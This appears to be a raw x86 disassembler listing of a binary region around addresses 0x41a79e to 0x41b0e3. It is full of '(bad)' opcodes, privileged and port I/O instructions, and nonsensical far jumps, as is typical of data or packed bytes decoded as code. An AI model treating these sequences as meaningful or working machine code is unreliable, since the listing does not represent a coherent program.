  41a79e:	push   0xc67fe662
  41a7a3:	inc    esi
  41a7a4:	mov    esi,edi
  41a7a6:	imul   eax,DWORD PTR [ebp-0x46],0x7cfb12e5
  41a7ad:	pop    esi
  41a7ae:	sbb    DWORD PTR [edx-0x37d7a69c],esp
  41a7b4:	out    dx,al
  41a7b5:	mov    ch,0x7b
  41a7b7:	fdiv   DWORD PTR [esi-0x59952b58]
  41a7bd:	loopne 0x41a826
  41a7bf:	push   es
  41a7c0:	and    BYTE PTR [esi],al
  41a7c2:	mov    eax,ds:0x3b3b4880
  41a7c7:	xchg   ecx,eax
  41a7c8:	xlat   BYTE PTR ds:[ebx]
  41a7c9:	and    eax,0xabcb1581
  41a7ce:	test   BYTE PTR [esi-0x3a07aae2],0x21
  41a7d5:	xchg   ebp,eax
  41a7d6:	ret    0x78fc
  41a7d9:	and    eax,DWORD PTR [ebx]
  41a7db:	ins    BYTE PTR es:[edi],dx
  41a7dc:	dec    esi
  41a7dd:	sbb    al,0x71
  41a7df:	lea    edi,[eax-0x176c2f19]
  41a7e5:	(bad)  
  41a7e7:	out    dx,al
  41a7e8:	adc    eax,0x330855dd
  41a7ed:	and    eax,0xc6176243
  41a7f2:	ja     0x41a794
  41a7f4:	rcl    DWORD PTR [edx+0x7d],0xe2
  41a7f8:	lods   eax,DWORD PTR ds:[esi]
  41a7f9:	gs push ebx
  41a7fb:	push   ebp
  41a7fc:	jns    0x41a869
  41a7fe:	adc    eax,0xd060f8cb
  41a803:	pop    edx
  41a804:	lods   eax,DWORD PTR ds:[esi]
  41a805:	jle    0x41a7f6
  41a807:	adc    cl,BYTE PTR [edi]
  41a809:	push   0x533b65d0
  41a80e:	(bad)  
  41a80f:	jmp    0x41a88c
  41a811:	daa    
  41a812:	adc    al,0xc4
  41a814:	adc    eax,0x7443e300
  41a819:	setg   BYTE PTR [esi+0x7c32aebd]
  41a820:	dec    edi
  41a821:	aad    0x93
  41a823:	push   esp
  41a824:	jmp    0x196a9ca3
  41a829:	cmp    BYTE PTR [eax],ch
  41a82b:	cmp    eax,0x5d31596c
  41a830:	xchg   BYTE PTR [esi],bh
  41a832:	test   BYTE PTR [edx-0x6b],cl
  41a835:	out    0xed,eax
  41a837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a838:	xchg   esp,eax
  41a839:	xor    bl,al
  41a83b:	ja     0x41a8a1
  41a83d:	lods   al,BYTE PTR ds:[esi]
  41a83e:	jl     0x41a83d
  41a840:	ror    cl,1
  41a842:	mov    eax,0x3fb69713
  41a847:	xor    esp,ebx
  41a849:	add    ecx,DWORD PTR [esi+0x7d1514f0]
  41a84f:	cdq    
  41a850:	std    
  41a851:	adc    eax,0x2a6176a4
  41a856:	je     0x41a895
  41a858:	retf   
  41a859:	ins    DWORD PTR es:[edi],dx
  41a85a:	mov    WORD PTR [esi+0x6f],?
  41a85d:	mov    ds:0x21309d3f,al
  41a862:	rol    esi,cl
  41a864:	(bad)  
  41a865:	call   0xaf02e9a0
  41a86a:	push   ecx
  41a86b:	lds    esi,FWORD PTR [edi]
  41a86d:	sub    DWORD PTR [edx*8+0x547e48da],esi
  41a874:	mov    eax,ds:0x32fd3e94
  41a879:	mov    ds:0x4b0d526f,al
  41a87e:	mov    cl,0xed
  41a880:	outs   dx,DWORD PTR ds:[esi]
  41a881:	fwait
  41a882:	cmc    
  41a883:	dec    edx
  41a884:	mov    eax,ds:0x434f1fad
  41a889:	jmp    0x41a8b3
  41a88b:	call   DWORD PTR [ebx+esi*8+0x68]
  41a88f:	sbb    eax,0x18d34179
  41a894:	addr16 dec ecx
  41a896:	js     0x41a89a
  41a898:	into   
  41a899:	daa    
  41a89a:	sbb    al,BYTE PTR [ecx-0x270b5352]
  41a8a0:	lods   al,BYTE PTR ds:[esi]
  41a8a1:	popf   
  41a8a2:	mov    bh,0x88
  41a8a4:	xlat   BYTE PTR ds:[ebx]
  41a8a5:	jmp    0xc42599ba
  41a8aa:	sub    ah,dl
  41a8ac:	adc    edi,DWORD PTR [edx]
  41a8ae:	mov    ebx,0x92419ab7
  41a8b3:	push   eax
  41a8b4:	xchg   esp,eax
  41a8b5:	sbb    ch,ch
  41a8b7:	cmc    
  41a8b8:	addr16 xchg esp,eax
  41a8ba:	ja     0x41a881
  41a8bc:	sub    al,0xd6
  41a8be:	jl     0x41a844
  41a8c0:	inc    edx
  41a8c1:	out    0xa9,eax
  41a8c3:	shl    DWORD PTR [ebp+0x493b0c26],0xfb
  41a8ca:	sub    al,BYTE PTR [ebp+0x20]
  41a8cd:	sub    esp,DWORD PTR [eax]
  41a8cf:	mov    edx,0x14a5bad5
  41a8d4:	cmc    
  41a8d5:	leave  
  41a8d6:	js     0x41a8b5
  41a8d8:	inc    ebx
  41a8d9:	jne    0x41a8e0
  41a8db:	jmp    0xb597:0xc3bbd9b5
  41a8e2:	push   edx
  41a8e3:	xor    eax,0xb751895
  41a8e8:	push   eax
  41a8e9:	std    
  41a8ea:	cmp    DWORD PTR [ecx],ebp
  41a8ec:	and    al,0x5b
  41a8ee:	and    al,0x43
  41a8f0:	shr    BYTE PTR [ebp+0x4],0x43
  41a8f4:	mov    edx,0x736f64a
  41a8f9:	dec    ebp
  41a8fa:	rcr    DWORD PTR [ebx-0x1c6cd26d],cl
  41a900:	cmp    cl,ch
  41a902:	arpl   WORD PTR [eax-0x14],ax
  41a905:	andps  xmm1,XMMWORD PTR [ecx+eiz*4-0x28a069ba]
  41a90d:	rol    BYTE PTR [ebp-0x7d8f38ec],cl
  41a913:	xor    BYTE PTR [ebx+0x1651878],dl
  41a919:	cld    
  41a91a:	sub    bh,BYTE PTR [edx+0x24]
  41a91d:	xor    edi,ecx
  41a91f:	push   edx
  41a920:	fnsave [ecx+0x4647ef0f]
  41a926:	iret   
  41a927:	push   ecx
  41a928:	mov    esi,0xad3ebea5
  41a92d:	out    0x91,eax
  41a92f:	sub    al,0xf4
  41a931:	push   esp
  41a932:	(bad)  
  41a933:	mov    cl,0x85
  41a935:	xchg   edi,eax
  41a936:	das    
  41a937:	iret   
  41a938:	adc    eax,DWORD PTR [edx+esi*1-0x74]
  41a93c:	iret   
  41a93d:	or     ebp,edx
  41a93f:	push   edi
  41a940:	div    BYTE PTR [ebx+0x60]
  41a943:	dec    ecx
  41a944:	iret   
  41a945:	sub    al,0x8b
  41a947:	ins    BYTE PTR es:[edi],dx
  41a948:	jg     0x41a8d2
  41a94a:	pop    eax
  41a94b:	mov    edi,0x86f04f40
  41a950:	mov    ds:0xd84afa9a,al
  41a955:	mov    ah,bh
  41a957:	and    eax,esp
  41a959:	cmc    
  41a95a:	int    0x53
  41a95c:	dec    ebp
  41a95d:	(bad)  
  41a95e:	xchg   esi,eax
  41a95f:	mov    eax,0x60907229
  41a964:	push   ss
  41a965:	in     eax,0x2c
  41a967:	sbb    BYTE PTR ds:0x772bdfbd,dl
  41a96d:	popa   
  41a96e:	mov    WORD PTR [ecx],fs
  41a970:	inc    edx
  41a971:	mov    al,ds:0x406154e9
  41a976:	lahf   
  41a977:	pop    esi
  41a978:	mov    ebx,0x4409a0fb
  41a97d:	xchg   esi,eax
  41a97e:	cvttps2pi mm1,QWORD PTR [edx+0x4e4c36a1]
  41a985:	rol    BYTE PTR ds:0x66c39420,0x58
  41a98c:	in     eax,0x7f
  41a98e:	and    dl,BYTE PTR [edi]
  41a990:	xchg   esp,eax
  41a991:	mov    al,ds:0xaa7a2760
  41a996:	fdiv   DWORD PTR [edi+0x2eb40ddd]
  41a99c:	sub    eax,0x4d2bbb2b
  41a9a1:	cs in  al,0x4a
  41a9a4:	jmp    0x88bf:0x35bb2de4
  41a9ab:	test   eax,0x9a74a73a
  41a9b0:	xchg   ebx,eax
  41a9b1:	push   ss
  41a9b2:	adc    BYTE PTR [edi+0x52c7a5f0],0x16
  41a9b9:	push   ecx
  41a9ba:	sti    
  41a9bb:	es sbb ebx,ebx
  41a9be:	das    
  41a9bf:	and    eax,0x2a84affe
  41a9c4:	jge    0x41a98d
  41a9c6:	lock lds esi,FWORD PTR [edx]
  41a9c9:	mov    eax,0xfa41dc20
  41a9ce:	mov    bh,0xd9
  41a9d0:	push   esi
  41a9d1:	sbb    edi,DWORD PTR [ecx+0x7760ddd]
  41a9d7:	dec    ecx
  41a9d8:	pop    dx
  41a9da:	fwait
  41a9db:	(bad)  
  41a9dc:	int    0x18
  41a9de:	and    BYTE PTR [esi-0x1d7e4552],dl
  41a9e4:	push   ecx
  41a9e5:	enter  0x7987,0x9c
  41a9e9:	inc    ecx
  41a9ea:	or     ebx,DWORD PTR [edx]
  41a9ec:	jns    0x41a9de
  41a9ee:	xor    DWORD PTR [esp+eiz*4],esi
  41a9f1:	mov    dl,0xad
  41a9f3:	fmul   QWORD PTR [ecx-0x7b]
  41a9f6:	lds    ebp,FWORD PTR [esi-0x5e187510]
  41a9fc:	repnz xchg edi,eax
  41a9fe:	mov    dh,0x84
  41aa00:	jb     0x41aa0d
  41aa02:	dec    esi
  41aa03:	int    0xe5
  41aa05:	retf   
  41aa06:	andps  xmm0,XMMWORD PTR [ecx-0xf]
  41aa0a:	xor    BYTE PTR [edx-0x42],bl
  41aa0d:	loop   0x41aa3c
  41aa0f:	push   0xffffffdf
  41aa11:	jmp    0xf868:0x12f8447f
  41aa18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa19:	in     al,dx
  41aa1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa1b:	les    edi,FWORD PTR [esi-0x26]
  41aa1e:	inc    eax
  41aa1f:	push   ds
  41aa20:	pusha  
  41aa21:	and    ch,BYTE PTR [ecx+ecx*2-0x27]
  41aa25:	sbb    bh,BYTE PTR [edi]
  41aa27:	(bad)  
  41aa28:	pop    edx
  41aa29:	sub    al,0x67
  41aa2b:	xor    DWORD PTR [edi-0x24],ebp
  41aa2e:	dec    esi
  41aa2f:	loopne 0x41aa45
  41aa31:	sahf   
  41aa32:	enter  0xb457,0xe8
  41aa36:	inc    edx
  41aa37:	lods   al,BYTE PTR ds:[esi]
  41aa38:	(bad)  
  41aa3a:	pop    es
  41aa3b:	push   ss
  41aa3c:	xor    BYTE PTR [edx],al
  41aa3e:	and    bl,BYTE PTR cs:[edi+0x204c5c87]
  41aa45:	outs   dx,DWORD PTR ds:[esi]
  41aa46:	or     bh,dl
  41aa48:	test   al,0xcd
  41aa4a:	retf   
  41aa4b:	jle    0x41aabb
  41aa4d:	sub    BYTE PTR [edi*4-0x4a5462a9],cl
  41aa54:	(bad)  
  41aa55:	jmp    0x11f5:0x777f130a
  41aa5c:	pusha  
  41aa5d:	fisub  DWORD PTR [ebx+0x6a]
  41aa60:	xchg   al,dh
  41aa62:	fcom   st(5)
  41aa64:	xlat   BYTE PTR ds:[ebx]
  41aa65:	loope  0x41a9ed
  41aa67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa68:	(bad)  
  41aa69:	jbe    0x41aaaf
  41aa6b:	dec    ebx
  41aa6c:	xor    edx,DWORD PTR [ecx+0x6f4eaf1c]
  41aa72:	bnd call 0x2b4b5a3a
  41aa78:	dec    edx
  41aa79:	loopne 0x41aada
  41aa7b:	sbb    ah,BYTE PTR [eax]
  41aa7d:	hlt    
  41aa7e:	xor    al,0x7e
  41aa80:	lods   eax,DWORD PTR ds:[esi]
  41aa81:	test   al,0x78
  41aa83:	push   edx
  41aa84:	loopne 0x41aaf0
  41aa86:	repnz rcr ah,1
  41aa89:	gs cmc 
  41aa8b:	jno    0x41aa19
  41aa8d:	dec    esi
  41aa8e:	test   ebx,ecx
  41aa90:	dec    eax
  41aa91:	nop
  41aa92:	push   ecx
  41aa93:	je     0x41aa40
  41aa95:	mov    ds:0x9995d831,al
  41aa9a:	mov    al,0xe1
  41aa9c:	sub    BYTE PTR [ebp+0x24a3f12f],cl
  41aaa2:	mov    eax,0x49dcfec6
  41aaa7:	and    al,0xed
  41aaa9:	or     al,0x6c
  41aaab:	jne    0x41aad8
  41aaad:	xchg   edx,eax
  41aaae:	mov    esp,0x9432f02e
  41aab3:	mov    cl,0x4d
  41aab5:	inc    eax
  41aab6:	and    al,0xbd
  41aab8:	imul   ecx,DWORD PTR [ebx-0x13f96b95],0xe4266e01
  41aac2:	retf   0xd605
  41aac5:	jbe    0x41ab2f
  41aac7:	pusha  
  41aac8:	lods   eax,DWORD PTR ds:[esi]
  41aac9:	dec    ecx
  41aaca:	lods   eax,DWORD PTR ds:[esi]
  41aacb:	sub    eax,0x29afed25
  41aad0:	mov    esp,0xcda69881
  41aad5:	xor    eax,0xbb66f18d
  41aada:	sar    BYTE PTR ds:0x7c845104,1
  41aae0:	cmc    
  41aae1:	add    cl,BYTE PTR [ebp+0x58]
  41aae4:	sub    eax,0x3267693
  41aae9:	out    dx,al
  41aaea:	stos   BYTE PTR es:[edi],al
  41aaeb:	xor    ah,ah
  41aaed:	mov    ch,0x6a
  41aaef:	jmp    0x41aa7a
  41aaf1:	arpl   WORD PTR [edx+0x68],cx
  41aaf4:	add    BYTE PTR [esi-0x71b53f41],dh
  41aafa:	cmp    al,BYTE PTR [ebp-0x44c62b8d]
  41ab00:	or     dh,BYTE PTR [eax+0x58dadc04]
  41ab06:	cmp    DWORD PTR [esi-0x6c],0x7384098f
  41ab0d:	xor    bh,BYTE PTR [edi]
  41ab0f:	cmc    
  41ab10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab11:	push   0xffffff84
  41ab13:	push   edx
  41ab14:	imul   DWORD PTR [esi-0x5894b125]
  41ab1a:	daa    
  41ab1b:	test   eax,edi
  41ab1d:	mov    eax,0xdfbc314a
  41ab22:	push   es
  41ab23:	sub    eax,0xffc0f08
  41ab28:	neg    DWORD PTR [esi]
  41ab2a:	dec    esi
  41ab2b:	outs   dx,DWORD PTR ds:[esi]
  41ab2c:	fcmovu st,st(1)
  41ab2e:	test   BYTE PTR [ecx+eiz*2],0xa0
  41ab32:	adc    DWORD PTR [edi+0x227da1c4],0x26
  41ab39:	push   ds
  41ab3a:	in     eax,0x9c
  41ab3c:	cmp    al,0x5a
  41ab3e:	lods   eax,DWORD PTR ds:[esi]
  41ab3f:	rol    BYTE PTR [esi+0x22],0x69
  41ab43:	lds    ecx,FWORD PTR [edi-0x57012bc2]
  41ab49:	loope  0x41aba1
  41ab4b:	adc    eax,0x12b5c332
  41ab50:	lods   al,BYTE PTR ds:[esi]
  41ab51:	ffree  st(1)
  41ab54:	mov    ebp,0xc03bd299
  41ab59:	jp     0x41ab66
  41ab5b:	cmc    
  41ab5c:	repnz bnd jne 0x41abdb
  41ab60:	mov    ecx,0x1062a089
  41ab65:	inc    eax
  41ab66:	test   eax,0xe149c57d
  41ab6b:	fwait
  41ab6c:	push   edi
  41ab6d:	dec    esp
  41ab6e:	jns    0x41ab51
  41ab70:	add    DWORD PTR [ebx-0x51bed3b7],esi
  41ab76:	push   0xe
  41ab78:	mov    ah,BYTE PTR [esi+0x41]
  41ab7b:	fisub  DWORD PTR [ebx-0x3c]
  41ab7e:	adc    DWORD PTR [edx+eiz*1+0x43c576f6],esp
  41ab85:	icebp  
  41ab86:	pop    ss
  41ab87:	mov    tr7,ecx
  41ab8a:	adc    ebx,esi
  41ab8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab8d:	xchg   edi,eax
  41ab8e:	jno    0x41ab90
  41ab90:	aaa    
  41ab91:	fld    DWORD PTR [ebp+0x53f6592d]
  41ab97:	ins    DWORD PTR es:[edi],dx
  41ab98:	(bad)
  41ab9b:	mov    ecx,0x94e0c0c8
  41aba0:	fidiv  DWORD PTR [ecx-0x14]
  41aba3:	xor    eax,eax
  41aba5:	xchg   esi,eax
  41aba6:	xchg   ecx,eax
  41aba7:	pop    esp
  41aba8:	test   al,0x3b
  41abaa:	mov    bh,BYTE PTR [ecx]
  41abac:	mov    ah,0x64
  41abae:	repz out 0x8d,al
  41abb1:	jo     0x41ac19
  41abb3:	ja     0x41ac04
  41abb5:	cmp    eax,0x3768e43e
  41abba:	loopne 0x41ab7e
  41abbc:	jg     0x41ab92
  41abbe:	push   cs
  41abbf:	jle    0x41abbd
  41abc1:	push   ss
  41abc2:	dec    edi
  41abc3:	cdq    
  41abc4:	(bad)  
  41abc5:	jg     0x41ab6a
  41abc7:	mov    cl,0x15
  41abc9:	test   BYTE PTR [eax],0x0
	...
  41ad98:	add    BYTE PTR [eax],al
  41ad9a:	and    eax,0x55d31474
  41ad9f:	repz out 0xf6,eax
  41ada2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ada3:	adc    bh,BYTE PTR [esi]
  41ada5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ada6:	xchg   esp,eax
  41ada7:	mov    cl,0x7d
  41ada9:	test   eax,0x1fde5
  41adae:	push   ds
  41adaf:	pop    es
  41adb0:	add    BYTE PTR [eax],al
  41adb2:	retf   0xfd6a
  41adb5:	mov    ecx,0x5b35e79d
  41adba:	xor    cl,BYTE PTR [ecx-0x3b]
  41adbd:	pop    ds
  41adbe:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41adc0:	or     al,0x10
  41adc2:	sbb    edi,edi
  41adc4:	inc    ebx
  41adc5:	mov    dh,0x41
  41adc7:	inc    edi
  41adc8:	inc    ecx
  41adc9:	shr    DWORD PTR [eax-0x2f7db96f],1
  41adcf:	cmp    al,0xba
  41add1:	fistp  DWORD PTR [edx]
  41add3:	ja     0x41adf1
  41add5:	add    BYTE PTR [ecx+0x5b],bl
  41add8:	jmp    0x9b7d:0xe505bc10
  41addf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ade0:	mov    eax,0x4137aed
  41ade5:	lods   eax,DWORD PTR ds:[esi]
  41ade6:	xor    DWORD PTR [ebx-0x69],esp
  41ade9:	xlat   BYTE PTR ds:[ebx]
  41adea:	enter  0xcb57,0xe5
  41adee:	xchg   edi,eax
  41adef:	(bad)
  41adf2:	(bad)  
  41adf3:	repnz and al,0x7c
  41adf6:	inc    esi
  41adf7:	je     0x41ae36
  41adf9:	adc    DWORD PTR [ebx-0x52],eax
  41adfc:	dec    ecx
  41adfd:	mov    ecx,0xfe84f2d2
  41ae02:	add    dl,BYTE PTR [ebx-0x625da9d6]
  41ae08:	out    dx,eax
  41ae09:	mov    dl,0xb
  41ae0b:	sbb    BYTE PTR [ebx],dh
  41ae0d:	mov    dh,0xb0
  41ae0f:	ror    BYTE PTR fs:[esi],0xe4
  41ae13:	es push esi
  41ae15:	stc    
  41ae16:	inc    esi
  41ae17:	loope  0x41adfd
  41ae19:	xchg   esi,eax
  41ae1a:	pop    ebp
  41ae1b:	jns    0x41ae6f
  41ae1d:	ins    DWORD PTR es:[edi],dx
  41ae1e:	pop    ebx
  41ae1f:	dec    ebp
  41ae20:	es rcr WORD PTR es:[eax],1
  41ae25:	cmp    dl,BYTE PTR [ecx]
  41ae27:	outs   dx,DWORD PTR ds:[esi]
  41ae28:	inc    esp
  41ae29:	jmp    DWORD PTR [eax+edi*8]
  41ae2c:	jp     0x41ae76
  41ae2e:	jbe    0x41ae25
  41ae30:	aaa    
  41ae31:	add    DWORD PTR [ebp+0xe],ecx
  41ae34:	sub    al,0x48
  41ae36:	leave  
  41ae37:	cld    
  41ae38:	pop    esp
  41ae39:	sub    BYTE PTR [ebp+0x67],cl
  41ae3c:	xchg   edi,eax
  41ae3d:	cmp    al,0xee
  41ae3f:	(bad)  
  41ae40:	cmc    
  41ae41:	adc    eax,0x7cbca826
  41ae46:	pop    es
  41ae47:	pop    edi
  41ae48:	shl    DWORD PTR [ecx-0x37af1ae9],cl
  41ae4e:	mov    WORD PTR [ecx-0x29],fs
  41ae51:	cmc    
  41ae52:	mov    ch,0xc4
  41ae54:	jnp    0x41ae6f
  41ae56:	daa    
  41ae57:	adc    dl,BYTE PTR ds:0x497917cd
  41ae5d:	retf   0xbd3
  41ae60:	or     al,dh
  41ae62:	out    dx,al
  41ae63:	test   DWORD PTR ds:0xa06a42de,ebp
  41ae69:	and    bl,ah
  41ae6b:	inc    ecx
  41ae6c:	imul   ecx,DWORD PTR [esi],0x4a5fae3e
  41ae72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae73:	jge    0x41ae9e
  41ae75:	daa    
  41ae76:	int    0x79
  41ae78:	jne    0x41aecd
  41ae7a:	(bad)  
  41ae7b:	fst    DWORD PTR [ecx+0x4b]
  41ae7e:	invd   
  41ae80:	mov    ss,esp
  41ae82:	mov    esi,0xb4c81e4f
  41ae87:	sar    esp,1
  41ae89:	lds    esi,FWORD PTR [esi+ebx*1]
  41ae8c:	icebp  
  41ae8d:	cmp    eax,0xc1dd22ae
  41ae92:	lahf   
  41ae93:	leave  
  41ae94:	fldcw  WORD PTR [edi+eax*2+0x6d74d231]
  41ae9b:	inc    eax
  41ae9c:	mov    al,ds:0xc529571c
  41aea1:	pop    edi
  41aea2:	cmp    ecx,edi
  41aea4:	aad    0xee
  41aea6:	in     al,dx
  41aea7:	call   0xc5269933
  41aeac:	(bad)  
  41aead:	xor    cl,BYTE PTR [ecx-0x1c8fc3f9]
  41aeb3:	mov    ebx,0x48a2e322
  41aeb8:	fist   DWORD PTR [ebx+eiz*1]
  41aebb:	aam    0xfb
  41aebd:	sbb    edx,DWORD PTR [edi+0x23f6aba0]
  41aec3:	add    ecx,DWORD PTR fs:[bx+si-0x60c3]
  41aec9:	mov    ecx,0x2fb8a596
  41aece:	test   DWORD PTR [eax+0x2f],edi
  41aed1:	mov    ebp,0xfaf20049
  41aed6:	in     eax,0xcd
  41aed8:	mov    ebx,0x1fa684ba
  41aedd:	jnp    0x41ae9b
  41aedf:	sbb    al,0x9f
  41aee2:	hlt    
  41aee3:	inc    esi
  41aee4:	(bad)  
  41aee5:	in     eax,dx
  41aee6:	call   0x49ea:0x51e3567b
  41aeed:	mov    ebx,DWORD PTR [eax-0x6623fde6]
  41aef3:	mov    edi,0x73383e5b
  41aef8:	pop    eax
  41aef9:	popa   
  41aefa:	popa   
  41aefb:	xor    DWORD PTR [eax-0x6a],esi
  41aefe:	add    DWORD PTR [ecx-0x26],edi
  41af01:	test   al,0x9c
  41af03:	and    esi,DWORD PTR [esi]
  41af05:	cmp    DWORD PTR [ebp-0x7a],0xbb73ff09
  41af0c:	or     ebp,0xffffffb8
  41af0f:	inc    ecx
  41af10:	xchg   ebx,eax
  41af11:	and    eax,0x8c62b753
  41af16:	(bad)  
  41af17:	jmp    0x41af47
  41af19:	call   0x27c3354d
  41af1e:	cmp    eax,0x762474ce
  41af23:	add    DWORD PTR [edi+0x11],esp
  41af26:	pop    es
  41af27:	es (bad) 
  41af2a:	mov    bh,0x6a
  41af2c:	pop    ecx
  41af2d:	jns    0x41aec4
  41af2f:	xor    ecx,DWORD PTR [ebp-0x1d]
  41af32:	add    DWORD PTR [esi+0x29dd3482],edx
  41af38:	data16 loope 0x41af74
  41af3b:	mov    ecx,DWORD PTR [ecx-0x13]
  41af3e:	cmc    
  41af3f:	out    dx,eax
  41af40:	mov    cs,edx
  41af42:	mov    al,BYTE PTR [edx+eiz*4+0x58894980]
  41af49:	fsubr  QWORD PTR [edx]
  41af4b:	or     esi,DWORD PTR [edi*8-0x7b65aacd]
  41af52:	push   eax
  41af53:	out    dx,eax
  41af54:	repz inc ebx
  41af56:	pop    edx
  41af57:	in     eax,0xe2
  41af59:	dec    eax
  41af5a:	retf   0x14c4
  41af5d:	aaa    
  41af5e:	jmp    0xc0c5:0x61fc63f9
  41af65:	out    dx,al
  41af66:	hlt    
  41af67:	xor    cl,BYTE PTR [ebx+ebp*1-0x77]
  41af6b:	adc    ch,ch
  41af6d:	ficomp DWORD PTR [edi-0xa6dd976]
  41af73:	out    dx,al
  41af74:	lods   eax,DWORD PTR ds:[esi]
  41af75:	and    eax,0x68f47b24
  41af7a:	scas   eax,DWORD PTR es:[edi]
  41af7b:	sub    bh,BYTE PTR [ecx+0x18651376]
  41af81:	in     al,0x0
  41af83:	je     0x41afb8
  41af85:	xor    esp,ecx
  41af87:	cmp    eax,0xf122717c
  41af8c:	loope  0x41b002
  41af8e:	ins    DWORD PTR es:[edi],dx
  41af8f:	mov    esi,0xe61a44
  41af94:	leave  
  41af95:	in     al,0x5b
  41af97:	jmp    0x41afea
  41af99:	jle    0x41b00c
  41af9b:	retf   
  41af9c:	loop   0x41aff4
  41af9e:	or     DWORD PTR ds:0x80b29e66,esi
  41afa4:	add    bl,BYTE PTR [edi]
  41afa6:	pusha  
  41afa7:	add    edi,DWORD PTR [eax]
  41afa9:	mov    WORD PTR [eax],gs
  41afab:	popf   
  41afac:	sbb    al,0x8e
  41afae:	popa   
  41afaf:	clc    
  41afb0:	adc    ebp,DWORD PTR [eax]
  41afb2:	push   0x44
  41afb4:	push   edi
  41afb5:	cmp    al,0x2a
  41afb7:	leave  
  41afb8:	push   es
  41afb9:	inc    esp
  41afba:	hlt    
  41afbb:	test   DWORD PTR [edx-0x64],0xc2278b94
  41afc2:	jne    0x41af77
  41afc4:	scas   al,BYTE PTR es:[edi]
  41afc5:	adc    DWORD PTR [edi-0x3783a83f],esp
  41afcb:	inc    ebx
  41afcc:	loop   0x41af7e
  41afce:	in     eax,0x32
  41afd0:	std    
  41afd1:	jbe    0x41b038
  41afd3:	mov    bh,0xd8
  41afd5:	(bad)
  41afd8:	mov    bh,0x4a
  41afda:	or     al,0xa0
  41afdd:	outs   dx,DWORD PTR ds:[esi]
  41afde:	and    cl,BYTE PTR [edi-0x37bdd88f]
  41afe4:	mov    DWORD PTR [ecx-0x2a9a3fbc],ebp
  41afea:	mov    ?,WORD PTR ds:0x2844ed08
  41aff0:	repz push ss
  41aff2:	test   BYTE PTR [edi+eax*2],ch
  41aff5:	adc    dl,BYTE PTR [edi-0x6c0c1e05]
  41affb:	pushf  
  41affc:	repnz add eax,0x394db4e3
  41b002:	add    ebp,DWORD PTR [edx]
  41b004:	inc    esi
  41b005:	stc    
  41b006:	mov    bh,0xa6
  41b008:	arpl   WORD PTR [edx+0x8],sp
  41b00b:	jbe    0x41b036
  41b00d:	push   edx
  41b00e:	jns    0x41b006
  41b010:	add    eax,0xf8002b20
  41b015:	xchg   ecx,esi
  41b017:	and    DWORD PTR [eax-0x4c],esi
  41b01a:	or     BYTE PTR [edx-0x6b5061fd],al
  41b020:	icebp  
  41b021:	loop   0x41b08f
  41b023:	mov    bh,0x29
  41b025:	test   bl,cl
  41b027:	sbb    DWORD PTR [edi+0x2b627fe9],ecx
  41b02d:	push   ebx
  41b02e:	mov    bh,0xae
  41b030:	(bad)  
  41b031:	leave  
  41b032:	adc    al,0x47
  41b034:	popf   
  41b035:	fnstsw WORD PTR [edx-0xa372c5b]
  41b03b:	out    dx,eax
  41b03c:	lea    ebx,[esi]
  41b03e:	adc    DWORD PTR [esi+eax*8-0x17165f8f],esi
  41b045:	das    
  41b046:	retf   0xefd
  41b049:	pop    esp
  41b04a:	stos   BYTE PTR es:[edi],al
  41b04b:	push   0x5a2beb67
  41b050:	or     eax,0x5d478d05
  41b055:	and    eax,0x8b3f9aa9
  41b05a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b05b:	mov    eax,0x5ff82f53
  41b060:	les    esp,FWORD PTR [ebx-0xe]
  41b063:	cwde   
  41b064:	xchg   esi,eax
  41b065:	dec    edi
  41b066:	cwde   
  41b067:	das    
  41b068:	das    
  41b069:	clc    
  41b06a:	cwde   
  41b06b:	mov    gs,eax
  41b06d:	pop    esi
  41b06e:	adc    DWORD PTR [ecx+0x7b12e570],ebx
  41b074:	lds    edx,FWORD PTR [edi-0x1ce4bce2]
  41b07a:	aaa    
  41b07b:	jge    0x41b01c
  41b07d:	sub    DWORD PTR [edi],ebx
  41b07f:	sub    al,0x22
  41b081:	cmp    esi,esi
  41b083:	sbb    dh,dl
  41b085:	out    dx,eax
  41b086:	sbb    ch,BYTE PTR [esi-0x3d]
  41b089:	jbe    0x41b03b
  41b08b:	call   0x97f92461
  41b090:	outs   dx,DWORD PTR ds:[esi]
  41b091:	mov    eax,0xbd980ea2
  41b096:	push   esi
  41b097:	jmp    0x41b0b2
  41b099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b09a:	fnstcw WORD PTR [ebp+0xb]
  41b09d:	in     eax,dx
  41b09e:	je     0x41b063
  41b0a0:	sub    DWORD PTR [ebx],ecx
  41b0a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0a3:	lods   al,BYTE PTR ds:[esi]
  41b0a4:	sub    dh,ah
  41b0a6:	jns    0x41b090
  41b0a8:	mov    ah,0x52
  41b0aa:	cmc    
  41b0ab:	sbb    DWORD PTR [ebx-0x2c7ebd83],ebp
  41b0b1:	push   ecx
  41b0b2:	mov    ch,0x1b
  41b0b4:	mov    edx,ds
  41b0b6:	adc    DWORD PTR [esi],eax
  41b0b8:	nop
  41b0b9:	lods   al,BYTE PTR ss:[esi]
  41b0bb:	out    0xef,al
  41b0bd:	add    edx,DWORD PTR [ebp-0x3093b2bd]
  41b0c3:	push   ds
  41b0c4:	repnz out dx,eax
  41b0c6:	push   edx
  41b0c7:	les    ecx,FWORD PTR [esi]
  41b0c9:	sbb    al,0xb1
  41b0cb:	push   ss
  41b0cc:	mov    edi,0x1537fd9c
  41b0d1:	xchg   esp,eax
  41b0d2:	pminsw mm1,QWORD PTR [ebx+0x4f2808f3]
  41b0d9:	iret   
  41b0da:	test   BYTE PTR [eax+0x7e],ch
  41b0dd:	sar    BYTE PTR [ebp+0x45],1
  41b0e0:	pop    edx
  41b0e1:	inc    ecx
  41b0e2:	inc    eax
  41b0e3:	sar    BYTE PTR [edi-0x73],cl
